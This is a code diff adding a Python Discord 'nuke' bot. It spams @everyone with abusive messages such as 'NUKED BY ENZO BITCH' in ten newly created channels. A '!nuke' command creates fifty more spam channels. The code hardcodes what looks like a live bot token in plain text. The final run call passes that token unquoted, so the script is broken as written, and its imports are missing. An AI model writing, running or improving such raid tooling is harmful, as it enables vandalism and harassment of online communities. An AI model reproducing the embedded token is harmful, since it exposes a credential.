@@ -1,0 +1,78 @@
+
+BOT_TOKEN = "MTU0NTM3NTEyMjg3NjE0NTc0NA.Gus-Ya.m65mP87Z-FJeXcIWS7dRPUKE4ghmeML6iyh30s"
+
+# Configuration
+CHANNEL_NAMES = [
+    "NUKED BY ENZO",
+    "FUCKED BY ENZO",
+    "ENZO DID IT",
+    "DESTROYED BY ENZO",
+    "ENZO SLAYED",
+    "ENZO WAS HERE",
+    "ENZO NUKED THIS",
+    "FUCKED UP BY ENZO",
+    "ENZO CHAOS",
+    "ENZO ANNIHILATED"
+]
+
+SPAM_MESSAGES = [
+    "NUKED BY ENZO BITCH @everyone",
+    "NUKED BY ENZO BITCH @here",
+    "FUCKED BY ENZO BITCH @everyone",
+    "@everyone @here ENZO WAS HERE"
+]
+
+class NukeBot(discord.Client):
+    def __init__(self):
+        intents = discord.Intents.default()
+        intents.message_content = True
+        super().__init__(intents=intents)
+
+    async def on_ready(self):
+        print(f"Logged in as {self.user}")
+        # Get the first guild (server) the bot is in
+        guild = self.guilds[0]
+        print(f"Nuking server: {guild.name}")
+        
+        # Create channels
+        for name in CHANNEL_NAMES:
+            try:
+                # Create text channel with the specified name
+                channel = await guild.create_text_channel(name)
+                print(f"Created channel: #{channel.name}")
+                
+                # Send spam messages to the new channel
+                for msg in SPAM_MESSAGES:
+                    await channel.send(msg)
+                print(f"Spammed messages in #{channel.name}")
+                
+                # Small delay to avoid rate limits (optional)
+                await asyncio.sleep(0.5)
+            except discord.Forbidden:
+                print(f"Missing permissions to create/send in {name}")
+            except Exception as e:
+                print(f"Error creating {name}: {e}")
+
+        print("Nuke complete!")
+        # Keep the bot running
+        await self.wait_until_closed()
+
+    async def on_message(self, message):
+        # Optional: Respond to a trigger command to start nuking
+        if message.content.startswith('!nuke'):
+            channel = message.channel
+            guild = channel.guild
+            
+            # Example: Create 50 more channels if triggered
+            for i in range(50):
+                try:
+                    new_channel = await guild.create_text_channel(f"NUKED-BY-ENZO-{i}")
+                    await new_channel.send("NUKED BY ENZO BITCH @everyone")
+                except:
+                    pass
+            await message.channel.send("Nuke initiated!")
+
+# Run the bot
+if __name__ == "__main__":
+    client = NukeBot()
+    client.run(MTU0NTM3NTEyMjg3NjE0NTc0NA.Gus-Ya.m65mP87Z-FJeXcIWS7dRPUKE4ghmeML6iyh30s)
